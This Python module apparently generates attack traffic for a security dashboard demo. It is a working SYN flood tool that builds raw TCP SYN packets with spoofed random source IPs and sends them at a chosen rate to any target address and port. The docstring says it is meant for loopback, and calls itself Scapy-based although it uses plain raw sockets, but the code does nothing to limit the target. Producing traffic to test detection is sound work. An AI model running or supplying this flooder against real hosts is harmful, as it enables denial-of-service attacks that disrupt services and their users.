"""
M6 — Attack Traffic Generators
================================
Scapy-based synthetic attack generators for live demo.
These send packets on the LOOPBACK or a virtual interface —
NOT on production networks.

Usage:
    python -m m6_dashboard.attack_gen.syn_flood --target 127.0.0.1 --port 80 --rate 1000
"""

import sys
import time
import random
import socket
import struct
import logging
import argparse
import threading
from typing import Optional

logger = logging.getLogger(__name__)


def _random_ip():
    return f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"


def _checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b'\x00'
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) + data[i+1]
    s = (s >> 16) + (s & 0xFFFF)
    s += (s >> 16)
    return ~s & 0xFFFF


def _build_ip_header(src_ip: str, dst_ip: str, proto: int = 6, payload_len: int = 20) -> bytes:
    ver_ihl  = (4 << 4) | 5
    tos      = 0
    total    = 20 + payload_len
    ident    = random.randint(0, 65535)
    flags_frag = 0
    ttl      = random.randint(48, 128)
    checksum = 0
    src      = socket.inet_aton(src_ip)
    dst      = socket.inet_aton(dst_ip)
    header   = struct.pack("!BBHHHBBH4s4s",
        ver_ihl, tos, total, ident, flags_frag,
        ttl, proto, checksum, src, dst)
    checksum = _checksum(header)
    return struct.pack("!BBHHHBBH4s4s",
        ver_ihl, tos, total, ident, flags_frag,
        ttl, proto, checksum, src, dst)


def _build_tcp_syn(src_port: int, dst_port: int) -> bytes:
    seq      = random.randint(0, 2**32 - 1)
    ack_seq  = 0
    data_off = (5 << 4)
    flags    = 0x002  # SYN
    window   = 65535
    checksum = 0
    urgent   = 0
    return struct.pack("!HHIIBBHHH",
        src_port, dst_port, seq, ack_seq,
        data_off, flags, window, checksum, urgent)


class SynFloodGenerator:
    """
    Sends raw TCP SYN packets with spoofed source IPs.
    Requires root/admin and raw socket support.
    Falls back to logging-only mode on Windows (no raw sockets).
    """

    def __init__(
        self,
        target_ip: str,
        target_port: int = 80,
        rate_pps: int = 500,
        duration_sec: float = 30.0,
    ):
        self.target_ip   = target_ip
        self.target_port = target_port
        self.rate        = rate_pps
        self.duration    = duration_sec
        self._sent       = 0

    def run(self):
        interval = 1.0 / self.rate if self.rate > 0 else 0
        end_time = time.time() + self.duration

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            use_raw = True
            logger.info("SYN Flood: raw socket mode — sending %d pps to %s:%d",
                        self.rate, self.target_ip, self.target_port)
        except (PermissionError, OSError):
            use_raw = False
            logger.warning("SYN Flood: no raw socket (needs admin) — simulation mode only")
            s = None

        while time.time() < end_time:
            src_ip   = _random_ip()
            src_port = random.randint(1024, 65535)
            tcp_hdr  = _build_tcp_syn(src_port, self.target_port)
            ip_hdr   = _build_ip_header(src_ip, self.target_ip, proto=6, payload_len=len(tcp_hdr))
            pkt      = ip_hdr + tcp_hdr

            if use_raw and s:
                try:
                    s.sendto(pkt, (self.target_ip, 0))
                except OSError:
                    pass
            else:
                # Simulation: just log
                logger.debug("SYN %s:%d → %s:%d", src_ip, src_port, self.target_ip, self.target_port)

            self._sent += 1
            if interval > 0:
                time.sleep(interval)

        if s:
            s.close()
        logger.info("SYN Flood complete: %d packets sent", self._sent)
        return self._sent


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    parser = argparse.ArgumentParser(description="SYN Flood Generator (demo)")
    parser.add_argument("--target", default="127.0.0.1")
    parser.add_argument("--port",   type=int, default=80)
    parser.add_argument("--rate",   type=int, default=500)
    parser.add_argument("--duration", type=float, default=10.0)
    args = parser.parse_args()
    gen = SynFloodGenerator(args.target, args.port, args.rate, args.duration)
    gen.run()
